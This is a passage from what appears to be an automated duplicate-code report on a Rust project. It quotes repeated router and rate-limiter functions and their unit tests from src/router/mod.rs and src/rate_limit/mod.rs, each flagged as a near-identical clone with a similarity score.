        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 352

**Code:**
```
    fn test_router_error_no_route() {
        let err = RouterError::NoRoute("/unknown".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("/unknown"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.6% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.6% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.2% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 445

**Code:**
```
    fn test_router_send_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let test_message = Message::request(1, "ping", None);
        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.send("/unknown", test_message)
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 409

**Code:**
```
    fn test_config_validation_sse_missing_url() {
        let config = ServerRouteConfig {
            name: "sse".to_string(),
            path_prefix: "/sse".to_string(),
            transport: TransportType::Sse,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 409

**Code:**
```
    fn test_config_validation_sse_missing_url() {
        let config = ServerRouteConfig {
            name: "sse".to_string(),
            path_prefix: "/sse".to_string(),
            transport: TransportType::Sse,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 359

**Code:**
```
    fn test_router_error_transport_init() {
        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("server1"));
        assert!(msg.contains("connection failed"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 352

**Code:**
```
    fn test_router_error_no_route() {
        let err = RouterError::NoRoute("/unknown".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("/unknown"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 352

**Code:**
```
    fn test_router_error_no_route() {
        let err = RouterError::NoRoute("/unknown".to_string());
        let msg = format!("{}", err);
        assert!(msg.contains("/unknown"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 556

**Code:**
```
    fn test_retry_after_populated() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        service.check("user", None);
        let result = service.check("user", None);

        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
        // Should be at least 1 second
        assert!(result.retry_after_secs.unwrap() >= 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 556

**Code:**
```
    fn test_retry_after_populated() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        service.check("user", None);
        let result = service.check("user", None);

        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
        // Should be at least 1 second
        assert!(result.retry_after_secs.unwrap() >= 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 556

**Code:**
```
    fn test_retry_after_populated() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        service.check("user", None);
        let result = service.check("user", None);

        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
        // Should be at least 1 second
        assert!(result.retry_after_secs.unwrap() >= 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 198

**Code:**
```
    fn get_tool_limiter(&self, key: &str, rps: u32, burst: u32) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this tool
        if let Some(mut entry) = self.tool_limiters.get_mut(key) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Create a new limiter for this tool
        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.tool_limiters.insert(key.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 166

**Code:**
```
    fn get_identity_limiter(&self, identity_id: &str, custom_limit: Option<u32>) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this identity
        if let Some(mut entry) = self.identity_limiters.get_mut(identity_id) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Note: Cleanup is now handled by a background task to avoid latency spikes
        // See start_cleanup_task() for the background cleanup implementation

        // Create a new limiter for this identity
        let (rps, burst) = if let Some(custom_rps) = custom_limit {
            // Use custom rate limit with proportional burst
            let custom_burst = (custom_rps as f32 * 0.5).max(1.0) as u32;
            (custom_rps, custom_burst)
        } else {
            // Use defaults
            (self.default_rps, self.default_burst)
        };

        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.identity_limiters.insert(identity_id.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 198

**Code:**
```
    fn get_tool_limiter(&self, key: &str, rps: u32, burst: u32) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this tool
        if let Some(mut entry) = self.tool_limiters.get_mut(key) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Create a new limiter for this tool
        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.tool_limiters.insert(key.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 556

**Code:**
```
    fn test_retry_after_populated() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        service.check("user", None);
        let result = service.check("user", None);

        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
        // Should be at least 1 second
        assert!(result.retry_after_secs.unwrap() >= 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.2% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 166

**Code:**
```
    fn get_identity_limiter(&self, identity_id: &str, custom_limit: Option<u32>) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this identity
        if let Some(mut entry) = self.identity_limiters.get_mut(identity_id) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Note: Cleanup is now handled by a background task to avoid latency spikes
        // See start_cleanup_task() for the background cleanup implementation

        // Create a new limiter for this identity
        let (rps, burst) = if let Some(custom_rps) = custom_limit {
            // Use custom rate limit with proportional burst
            let custom_burst = (custom_rps as f32 * 0.5).max(1.0) as u32;
            (custom_rps, custom_burst)
        } else {
            // Use defaults
            (self.default_rps, self.default_burst)
        };

        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.identity_limiters.insert(identity_id.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.8% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.6% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 198

**Code:**
```
    fn get_tool_limiter(&self, key: &str, rps: u32, burst: u32) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this tool
        if let Some(mut entry) = self.tool_limiters.get_mut(key) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Create a new limiter for this tool
        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.tool_limiters.insert(key.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.2% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 166

**Code:**
```
    fn get_identity_limiter(&self, identity_id: &str, custom_limit: Option<u32>) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this identity
        if let Some(mut entry) = self.identity_limiters.get_mut(identity_id) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Note: Cleanup is now handled by a background task to avoid latency spikes
        // See start_cleanup_task() for the background cleanup implementation

        // Create a new limiter for this identity
        let (rps, burst) = if let Some(custom_rps) = custom_limit {
            // Use custom rate limit with proportional burst
            let custom_burst = (custom_rps as f32 * 0.5).max(1.0) as u32;
            (custom_rps, custom_burst)
        } else {
            // Use defaults
            (self.default_rps, self.default_burst)
        };

        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.identity_limiters.insert(identity_id.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.2% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 198

**Code:**
```
    fn get_tool_limiter(&self, key: &str, rps: u32, burst: u32) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this tool
        if let Some(mut entry) = self.tool_limiters.get_mut(key) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Create a new limiter for this tool
        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.tool_limiters.insert(key.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 67

**Code:**
```
    fn allowed(limit: u32, remaining: u32, reset_at: u64) -> Self {
        Self {
            allowed: true,
            retry_after_secs: None,
            limit,
            remaining,
            reset_at,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 77

**Code:**
```
    fn denied(retry_after_secs: u64, limit: u32, reset_at: u64) -> Self {
        Self {
            allowed: false,
            retry_after_secs: Some(retry_after_secs),
            limit,
            remaining: 0,
            reset_at,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.7% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.7% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.2% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.2% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 157

**Code:**
```
    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);

        let quota = Quota::per_second(rps).allow_burst(burst);
        RateLimiter::direct(quota)
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 457

**Code:**
```
    fn test_rate_limit_disabled() {
        let config = test_config(false, 1, 1);
        let service = RateLimitService::new(&config);

        // Should always allow when disabled
        for _ in 0..100 {
            let result = service.check("test", None);
            assert!(result.allowed);
            assert!(result.retry_after_secs.is_none());
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

